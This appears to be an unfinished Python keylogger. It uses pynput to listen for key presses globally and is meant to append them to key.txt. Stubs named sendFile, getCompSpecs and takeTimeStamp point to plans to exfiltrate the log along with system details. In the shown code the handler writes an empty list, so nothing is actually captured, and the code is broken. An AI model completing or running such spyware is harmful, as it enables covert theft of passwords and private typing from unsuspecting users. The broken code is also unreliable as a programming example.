from pynput import keyboard
import logging


def key_press(key):
    count = 0
    keys = []
    
    readToFile(keys)
    



def readToFile(keys):
    # if keys.length:
    #     return
    
    with open ("key.txt", 'a') as file:
        for key in keys:
            file.write(key)
            
    
    
    
    
def takeTimeStamp():
    print('')

def getCompSpecs(): 
    print('')
    
def sendFile():
    print('')    




if __name__ == "__main__":
    listener = keyboard.Listener(on_press=key_press)
    listener.start()
    readToFile([])
    input()